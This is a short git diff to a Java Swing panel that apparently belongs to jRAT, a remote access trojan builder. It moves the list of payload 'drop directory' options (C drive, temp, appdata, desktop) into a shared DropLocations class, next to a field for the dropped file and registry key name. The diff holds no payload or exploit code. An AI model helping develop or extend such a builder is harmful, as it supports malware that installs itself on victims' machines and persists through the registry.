@@ -18,6 +18,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 
 import se.jrat.client.Help;
 import se.jrat.client.settings.Settings;
+import se.jrat.common.DropLocations;
 
 
 @SuppressWarnings("serial")
@@ -79,7 +80,7 @@ public class PanelBuildStartup extends JPanel {
 
 		comboBox = new JComboBox<String>();
 		comboBox.setToolTipText("Drop directory");
-		comboBox.setModel(new DefaultComboBoxModel<String>(new String[] { "root/C drive", "temp/documents (UNIX)", "appdata", "desktop" }));
+		comboBox.setModel(new DefaultComboBoxModel<String>(DropLocations.STRINGS));
 
 		JLabel lblDroppedFileAnd = new JLabel("Dropped file and reg key name:");
 
